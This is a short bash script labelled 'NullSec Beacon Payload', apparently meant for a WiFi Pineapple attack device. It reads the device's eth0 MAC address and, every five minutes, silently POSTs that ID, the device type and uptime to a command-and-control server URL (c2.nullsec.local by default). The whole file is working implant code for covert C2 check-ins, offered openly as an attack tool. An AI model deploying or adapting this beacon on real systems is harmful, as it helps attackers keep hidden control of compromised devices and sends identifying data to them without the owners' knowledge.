#!/bin/bash
# NullSec Beacon Payload
# Sends beacon to C2 on startup

C2_URL="${NULLSEC_C2:-http://c2.nullsec.local/beacon}"
DEVICE_ID=$(cat /sys/class/net/eth0/address 2>/dev/null | tr -d ':')

while true; do
    DATA="device=$DEVICE_ID&type=pineapple&uptime=$(uptime -s)"
    curl -s -X POST -d "$DATA" "$C2_URL" 2>/dev/null
    sleep 300
done
